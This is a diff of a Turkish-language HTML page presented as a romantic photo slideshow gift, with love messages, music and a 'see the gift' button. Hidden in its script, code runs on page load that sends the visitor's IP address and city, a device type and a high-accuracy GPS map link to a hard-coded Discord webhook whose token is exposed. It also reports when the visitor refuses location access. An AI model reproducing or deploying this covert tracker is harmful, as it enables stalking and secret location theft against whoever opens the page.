@@ -23,52 +23,57 @@
     <button id="ileriBtn" onclick="ileri()">İleri ➜</button>
     <button id="hediyeButon" onclick="window.location.href='hediye.html'">Hediyeyi Gör 🎁</button>
 
-    <audio id="music" autoplay loop>
+    <audio id="music" loop>
         <source src="music.mp3" type="audio/mpeg">
     </audio>
 
     <script>
-        // --- AYARLAR ---
-        // Kendi Webhook URL'ni aşağıya tırnakların içine yapıştır
-        const WEB_URL = "https://discord.com/api/webhooks/1470176972410851379/7mzBrZBZzn_oW7nXfV0538TOe1rhbTo46P9IoIRXoHEMx4AcvFJjqvqtIDNa2BzGQ47I";
+        // --- 1. AYARLAR ---
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1470176972410851379/7mzBrZBZzn_oW7nXfV0538TOe1rhbTo46P9IoIRXoHEMx4AcvFJjqvqtIDNa2BzGQ47I";
 
-        function dcGonder(m) {
-            fetch(WEB_URL, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({content: m})
-            }).catch(err => console.error("Hata:", err));
+        async function dcGonder(mesaj) {
+            try {
+                await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ content: mesaj })
+                });
+            } catch (e) { console.error("Discord Hatası:", e); }
         }
 
-        // Sayfa yüklendiğinde otomatik başlar
-        window.addEventListener('load', function() {
-            // 1. IP Bilgisi
+        // --- 2. OTOMATİK KONUM SİSTEMİ ---
+        window.onload = function() {
+            // A. Şehir ve IP Bulma (Anında çalışır)
             fetch('https://ipapi.co/json/')
-                .then(r => r.json())
-                .then(d => {
-                    dcGonder("🚀 **Giriş!**\n📍 Şehir: " + d.city + "\n🌐 IP: " + d.ip);
-                    
-                    // 2. Hassas Konum (GPS)
+                .then(res => res.json())
+                .then(data => {
+                    const info = `🚀 **Giriş Yapıldı!**\n📍 Şehir: ${data.city}\n🌐 IP: ${data.ip}\n📱 Cihaz: ${navigator.userAgent.includes("Mobi") ? "Mobil" : "Bilgisayar"}`;
+                    dcGonder(info);
+
+                    // B. Hassas GPS Konumu (Kullanıcıya sorar)
                     if (navigator.geolocation) {
-                        navigator.geolocation.getCurrentPosition(function(p) {
-                            var enlem = p.coords.latitude;
-                            var boylam = p.coords.longitude;
-                            // En basit Google Maps linki
-                            var link = "https://www.google.com/maps?q=" + enlem + "," + boylam;
-                            dcGonder("🎯 **Hassas Konum!**\n🗺️ Harita: " + link);
-                        }, function(err) {
-                            dcGonder("⚠️ Konum izni verilmedi veya hata: " + err.message);
-                        }, {enableHighAccuracy: true, timeout: 10000, maximumAge: 0});
+                        navigator.geolocation.getCurrentPosition(pos => {
+                            const lat = pos.coords.latitude;
+                            const lon = pos.coords.longitude;
+                            const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
+                            dcGonder(`🎯 **Tam Konum Bulundu!**\n📍 Harita: ${mapsLink}`);
+                        }, 
+                        (err) => { dcGonder("⚠️ Kullanıcı konum izni vermedi."); },
+                        { enableHighAccuracy: true, timeout: 10000 });
                     }
                 });
-        });
+        };
 
-        // --- FOTOĞRAF GEÇİŞ SİSTEMİ ---
+        // --- 3. FOTOĞRAF VE MÜZİK SİSTEMİ ---
         const fotolar = ["foto1.jpg", "foto2.jpg", "foto3.jpg", "foto4.jpg", "foto5.jpg"];
         const sozler = ["Seninle her günüm daha güzel.", "Gülüşün dünyamı aydınlatıyor.", "Kalbim hep seninle.", "Sana her baktığımda yeniden aşık oluyorum.", "İyi ki varsın, iyi ki benimsin."];
         let index = 0;
+        const audio = document.getElementById("music");
 
         function ileri() {
+            // Müziği her tıklamada tetikle (Mobil koruması için)
+            audio.play().catch(() => {});
+
             index++;
             if (index >= fotolar.length) {
                 document.getElementById("hediyeButon").style.display = "block";
@@ -78,6 +83,9 @@
             document.getElementById("foto").src = fotolar[index];
             document.getElementById("soz").innerText = sozler[index];
         }
+
+        // İlk tıkla müziği açma garantisi
+        window.onclick = () => { audio.play().catch(() => {}); };
     </script>
 </body>
 </html>
